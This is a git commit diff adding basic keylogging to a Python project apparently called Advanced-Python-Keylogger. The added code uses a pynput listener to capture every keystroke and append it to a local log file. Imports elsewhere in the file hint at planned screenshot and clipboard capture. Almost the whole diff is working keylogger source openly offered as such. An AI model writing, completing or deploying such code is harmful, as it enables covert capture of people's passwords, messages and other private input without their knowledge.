34075d163a9987d8627974289cd9456d6913581d
JoshMcleods <160990042+JoshMcleods@users.noreply.github.com>
2025-07-07 17:10:56 +1000

    basic keylogging functionality using pynput

--- Keylogger/keylogger.py
+++ Keylogger/keylogger.py
@@ -24,3 +24,45 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 import pyperclip
+
+keys_information = "key_log.txt"
+
+file_path = "//Users//joshuamcleod//Advanced-Python-Keylogger//Keylogger"
+extend = "//"
+
+count = 0
+keys = []
+
+
+def on_press(key):
+    global keys, count
+
+    print(key)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a",) as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
